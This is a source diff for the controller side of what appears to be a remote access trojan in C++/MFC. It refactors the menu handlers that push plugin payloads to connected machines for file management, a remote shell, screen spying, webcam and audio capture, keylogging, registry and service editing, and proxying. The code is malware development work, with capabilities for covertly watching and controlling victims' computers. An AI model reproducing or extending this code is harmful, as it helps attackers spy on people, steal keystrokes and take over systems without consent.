@@ -28,28 +28,18 @@ extern CMainFrame* g_pFrame;
 extern 	CIOCPServer* m_iocpServer;
 extern CLogView* g_pLogView;
 
-extern LPBYTE lpFilePacket ;
-extern LPBYTE lpShellPacket;
-extern LPBYTE lpScreenPacket;
-extern LPBYTE lpWebCamPacket;
-extern LPBYTE lpAudioPacket ;
-extern LPBYTE lpSystemPacket;
-extern LPBYTE lpKeyboardPacket;
-extern LPBYTE lpServicePacket;
-extern LPBYTE lpRegeditPacket;
-extern LPBYTE lpTextChatPacket;
-extern LPBYTE lpProxyMapPacket;
-extern int nFilePacketLength;
-extern int nShellPacketLength;
-extern int nScreenPacketLength;
-extern int nWebCamPacketLength;
-extern int nAudioPacketLength;
-extern int nSystemPacketLength;
-extern int nKeyboardPacketLength;
-extern int nServicePacketLength;
-extern int nRegeditPacketLength;
-extern int nTextChatPacketLength;
-extern int nProxyPacketLength;
+extern PDllCode lpFilePacket ;
+extern PDllCode lpShellPacket;
+extern PDllCode lpScreenPacket;
+extern PDllCode lpWebCamPacket;
+extern PDllCode lpAudioPacket ;
+extern PDllCode lpSystemPacket;
+extern PDllCode lpKeyboardPacket;
+extern PDllCode lpServicePacket;
+extern PDllCode lpRegeditPacket;
+extern PDllCode lpTextChatPacket;
+extern PDllCode lpProxyMapPacket;
+
 typedef struct {
     char	*title;
     int		nWidth;
@@ -979,44 +969,36 @@ BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
 
 void CPcView::OnMenuitemFilemanager()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpFilePacket, nFilePacketLength );
+    SendSelectCommand(lpFilePacket->Code(), lpFilePacket->Length());
 }
 
 void CPcView::OnMenuitemRemoteshell()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpShellPacket, nShellPacketLength  );
+    SendSelectCommand(lpShellPacket->Code(), lpShellPacket->Length());
 }
 
 void CPcView::OnMenuitemScreenspy()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpScreenPacket, nScreenPacketLength );
+    SendSelectCommand(lpScreenPacket->Code(), lpScreenPacket->Length());
 }
 
 void CPcView::OnMenuitemWebcam()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpWebCamPacket, nWebCamPacketLength );
+    SendSelectCommand(lpWebCamPacket->Code(), lpWebCamPacket->Length());
 }
 
 void CPcView::OnMenuitemAudioListen()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpAudioPacket, nAudioPacketLength );
+    SendSelectCommand(lpAudioPacket->Code(), lpAudioPacket->Length());
 }
 
 void CPcView::OnMenuitemSystem()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpSystemPacket, nSystemPacketLength );
+    SendSelectCommand(lpSystemPacket->Code(), lpSystemPacket->Length());
 }
 
 void CPcView::OnMenuitemKeyboard()   //¼üÅÌ¼ÇÂ¼
 {
-    // TODO: Add your command handler code here
-//	SendSelectCommand(lpKeyboardPacket , nKeyboardPacketLength );
     BYTE	bToken = COMMAND_KEYBOARD;
     SendSelectCommand(&bToken, sizeof(BYTE));
     LocalFree((LPBYTE)&bToken);
@@ -1024,34 +1006,28 @@ void CPcView::OnMenuitemKeyboard()   //¼üÅÌ¼ÇÂ¼
 
 void CPcView::OnChat() //¼ôÇÐ°å
 {
-    // TODO: Add your command handler code here
-
     BYTE	bToken = COMMAND_CHAT;
     SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 void CPcView::OnMenuitemServicemanager()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpServicePacket, nServicePacketLength );
+    SendSelectCommand(lpServicePacket->Code(), lpServicePacket->Length());
 }
 
 void CPcView::OnMenuitemRegedit()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpRegeditPacket, nRegeditPacketLength );
+    SendSelectCommand(lpRegeditPacket->Code(), lpRegeditPacket->Length());
 }
 
 void CPcView::OnMenuitemTextChat()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpTextChatPacket, nTextChatPacketLength );
+    SendSelectCommand(lpTextChatPacket->Code(), lpTextChatPacket->Length());
 }
 
 void CPcView::OnMenuitemProxyMap()
 {
-    // TODO: Add your command handler code here
-    SendSelectCommand(lpProxyMapPacket, nProxyPacketLength );
+    SendSelectCommand(lpProxyMapPacket->Code(), lpProxyMapPacket->Length());
 }
 
 
@@ -1547,16 +1523,10 @@ void CPcView::OnMenuitemProxy()
         } else
             wsprintf(szToken,"%d",dlg.m_edit_port);
 
-
-        int nPacketLength = 100 + PROXYMyFileSize;
-        LPBYTE lpPacket = new BYTE[nPacketLength];
-        if(lpPacket == NULL)			return;
-        lpPacket[0] = COMMAND_OPEN_PROXY;
-        memcpy(lpPacket + 1, szToken, 99);
-        memcpy(lpPacket + 100,PROXYMyFileBuf,PROXYMyFileSize);
-
-        SendSelectCommand(lpPacket, nPacketLength);
-        delete [] lpPacket;
+        PDllCode lpPacket = new DllCode(COMMAND_OPEN_PROXY, PROXYMyFileBuf, sizeof(PROXYMyFileBuf), 99);
+        lpPacket->SetReserved(szToken);
+        SendSelectCommand(lpPacket->Code(), lpPacket->Length());
+        SAFE_DELETE(lpPacket);
     } else if (nRet == IDNO) {
         BYTE bToken = COMMAND_CLOSE_PROXY;
         SendSelectCommand(&bToken,sizeof(bToken));
